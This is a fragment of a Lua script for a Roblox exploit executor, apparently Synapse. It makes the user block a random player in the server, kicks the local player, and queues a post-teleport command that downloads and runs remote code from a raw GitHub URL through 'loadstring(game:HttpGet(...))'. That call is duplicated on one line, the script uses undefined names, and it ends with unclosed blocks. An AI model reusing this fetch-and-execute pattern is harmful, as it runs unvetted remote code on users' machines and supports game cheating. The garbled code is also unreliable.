local block = {}
if #game.Players:GetChildren() ~= 1 then
	for _,v in pairs(game.Players:GetPlayers()) do
		if v.Name ~= game.Players.LocalPlayer.Name then
			table.insert(block, v.Name)
		end
	end
	if block[1] ~= nil then
		local v = math.random(1,#block)
		local e = block[v]
		game.StarterGui:SetCore("PromptBlockPlayer", game.Players[e])
	end
	wait(0.125)
	if re ~= true then
		game.Players.LocalPlayer:Kick()
		LOG("players were in server")
		wait(0.5)
		syn.queue_on_teleport([[
wait(5)
loadstring(game:HttpGet('https://raw.githubusercontent.com/Antedx/AntID/main/Ante'))()loadstring(game:HttpGet('https://raw.githubusercontent.com/Antedx/AntID/main/Ante'))()
Log2()
    ]])
